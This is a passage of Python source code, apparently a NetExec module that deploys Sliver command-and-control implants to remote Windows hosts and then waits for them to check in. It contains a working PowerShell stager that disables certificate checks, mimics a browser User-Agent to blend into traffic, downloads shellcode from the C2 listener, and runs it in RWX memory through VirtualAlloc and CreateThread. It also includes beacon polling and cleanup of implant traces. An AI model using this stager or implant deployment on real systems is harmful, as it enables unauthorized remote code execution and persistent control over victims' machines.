                stage_url = f"tcp://{self.shellcode_listener_host or self.rhost}:{self.shellcode_listener_port or self.rport}/{stage2_profile_name}"

            
            context.log.debug(f"Stage URL: {stage_url}")
            
            # Generate tiny PowerShell bootstrap that downloads Stage 2 from stager URL
            bootstrap_ps = self._generate_http_download_bootstrap(stage_url, os_type)
            
            # Return raw UTF-8 bytes (caller will encode for PowerShell -EncodedCommand)
            bootstrap_bytes = bootstrap_ps.encode('utf-8')
            context.log.info(f"Bootstrap stager generated ({len(bootstrap_bytes)} bytes raw)")
            return bootstrap_bytes
        except Exception as e:
            context.log.fail(f"Stager gen failed: {e}")
            raise

    def _generate_http_download_bootstrap(self, stage_url, os_type):
        """Generate tiny HTTP downloader bootstrap for Sliver stager.
        
        This creates a minimal PowerShell script (~2KB) that downloads full shellcode
        from a Sliver stager listener and executes it in-memory. The small payload size
        ensures compatibility with WinRM's 150KB envelope limit.
        
        The bootstrap performs three operations:
            1. Downloads shellcode (~17MB) from stager URL via HTTP
            2. Allocates RWX memory with VirtualAlloc
            3. Executes shellcode in-memory with CreateThread
            
        Security considerations:
            - Uses TLS 1.2 for encrypted transport
            - Disables certificate validation (required for self-signed C2 certs)
            - Mimics browser User-Agent for traffic blending
            - Executes entirely in-memory (no disk writes)
        
        Args:
            stage_url: HTTP/HTTPS URL where shellcode is hosted by Sliver stager listener
                      Format: http://10.0.0.1:8080/nxc_stage2_abc123
            os_type: Target OS type (currently only 'windows' supported)
        
        Returns:
            PowerShell script as string (not encoded - caller handles encoding chain)
        """
        if os_type == "windows":
            # PowerShell bootstrap for in-memory shellcode execution
            download_ps = f'''
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;
$ProgressPreference = 'SilentlyContinue';
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};

# Download shellcode from stager listener
$wc = New-Object System.Net.WebClient;
$wc.Headers.Add('User-Agent', 'Mozilla/5.0');
$bytes = $wc.DownloadData('{stage_url}');
$wc.Dispose();

# Allocate RWX memory for shellcode execution
# Memory flags: 0x1000 = MEM_COMMIT, 0x2000 = MEM_RESERVE
# Protection: 0x40 = PAGE_EXECUTE_READWRITE
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Mem {{
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr start, IntPtr p, uint c, IntPtr id);
}}
"@;

$addr = [Mem]::VirtualAlloc(0, $bytes.Length, (0x1000 -bor 0x2000), 0x40);
[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $addr, $bytes.Length);
[Mem]::CreateThread(0, 0, $addr, 0, 0, 0);
'''
            return download_ps
        else:
            raise ValueError(f"OS type {os_type} not supported for bootstrap stager")

    def _save_implant_to_temp(self, implant_data):
        """
        Save implant bytes to local temporary file.
        Returns temp file path for upload.
        """
        tmp_file = tempfile.NamedTemporaryFile(delete=False, suffix=f".{self.extension}")
        tmp_file.write(implant_data)
        tmp_file.close()
        return tmp_file.name

    def _wait_for_beacon_and_cleanup(self, context, connection, full_remote_path, os_type, implant_name, handler, protocol, cleanup_mode="always", listener_job_id=None, website_name=None):
        """
        Wait for beacon via Sliver polling, then optionally cleanup using handler cmd.
        Falls back to timeout if polling fails.
        
        Args:
            context: NetExec context
            connection: NetExec connection
            full_remote_path: Path to remote implant file (None for in-memory staging)
            os_type: Target OS
            implant_name: Generated implant name
            handler: Protocol handler
            protocol: Protocol name
            cleanup_mode: When to cleanup - "always", "success", or "never"
            listener_job_id: HTTP listener job ID to kill (for HTTP staging cleanup)
            website_name: Sliver website name to remove (for HTTP staging cleanup)
        """

        beacon_registered = self._wait_for_beacon(context, implant_name, timeout=self.wait_seconds)
        
        if not beacon_registered:
            if cleanup_mode != "never":
                context.log.display("Beacon not detected within timeout — cleaning up anyway")
            else:
                context.log.display("Beacon not detected within timeout")
        
        # Determine if we should cleanup based on cleanup_mode
        should_cleanup = False
        if cleanup_mode == "always":
            should_cleanup = True
        elif cleanup_mode == "success" and beacon_registered:
            should_cleanup = True
        elif cleanup_mode == "never":
            should_cleanup = False

        if should_cleanup:
            # Cleanup HTTP staging resources (listener + website)
            if listener_job_id:
                try:
                    context.log.display(f"Stopping HTTP listener (Job ID: {listener_job_id})...")
                    self._worker_submit('kill_job', listener_job_id)
                    context.log.info("HTTP listener stopped")
                except Exception as e:
                    context.log.warning(f"Failed to stop HTTP listener: {e}")
            
            if website_name:
                try:
                    context.log.display(f"Removing Sliver website '{website_name}'...")
                    self._worker_submit('website_remove', website_name)
                    context.log.info("Sliver website removed")
                except Exception as e:
                    context.log.warning(f"Failed to remove website: {e}")
            
            # Cleanup remote implant file (for non-staging or file-based staging)
            if full_remote_path:
                cleanup_cmd = handler.get_cleanup_cmd(full_remote_path, os_type)
                method = self._get_exec_method(protocol)
                try:
                    if protocol == "winrm":
                        result = connection.ps_execute(cleanup_cmd, get_output=True)
                        if result and result.strip():
                            context.log.debug(f"PowerShell cleanup output: {result}")
                    else:
                        connection.execute(cleanup_cmd, methods=[method])
                    context.log.info("Cleaned up remote implant")
                except Exception as e:
                    context.log.warning(f"Cleanup failed: {e}")
            elif not listener_job_id and not website_name:
                context.log.info("Cleanup skipped (staging: in-memory)")

    def _wait_for_beacon(self, context, implant_name, timeout=30):
        """
        Poll Sliver gRPC for beacon or session check-in.
        Returns True if beacon or session connects within timeout, else False.
        """
        context.log.info(f"Waiting up to {timeout}s for beacon or session check-in...")

        # Ensure connected before polling
        worker = self.__class__._get_shared_worker()
        try:
            worker.submit_task('connect', self.config_path)
            context.log.debug("Re/connected to Sliver for polling")
        except Exception as e:
            context.log.warning(f"Connect failed before polling: {e}")

        start_time = time.time()
        poll_attempts = 0

        try:
            while time.time() - start_time < timeout:
                poll_attempts += 1
                try:
                    beacons = worker.submit_task('beacons')
                    sessions = worker.submit_task('sessions')
                    context.log.debug(f"Poll {poll_attempts}: Got {len(beacons)} beacons, {len(sessions)} sessions")
                except Exception as poll_e:
                    context.log.warning(f"Poll {poll_attempts} failed: {type(poll_e).__name__}: {poll_e}")
                    beacons = []
                    sessions = []

                for beacon in beacons:
                    if beacon.Name.startswith(implant_name):
                        context.log.success(f"Beacon connected! ID: {beacon.ID}, Name: {beacon.Name}")
                        return True

                for session in sessions:
                    if session.Name.startswith(implant_name):
                        context.log.success(f"Session connected! ID: {session.ID}, Name: {session.Name}")
                        return True

                context.log.debug(f"Poll {poll_attempts} no match; sleeping 1s (elapsed: {time.time() - start_time:.1f}s)")
                time.sleep(1)

            context.log.debug(f"Timeout after {poll_attempts} polls")
            return False
        except Exception as e:
            context.log.warning(f"Unexpected polling error: {type(e).__name__}: {e}")
            return False

    def _cleanup_local_temp(self, tmp_path):
        """
        Always cleanup local temp implant file.
        """
        if tmp_path and os.path.exists(tmp_path):
            try:
                os.unlink(tmp_path)
            except Exception:
                pass

    def cleanup(self):
        """
        Cleanup module resources, including shutting down the gRPC worker thread.
        """
        if self.__class__._shared_worker is not None:
            self.__class__._shared_worker.shutdown()
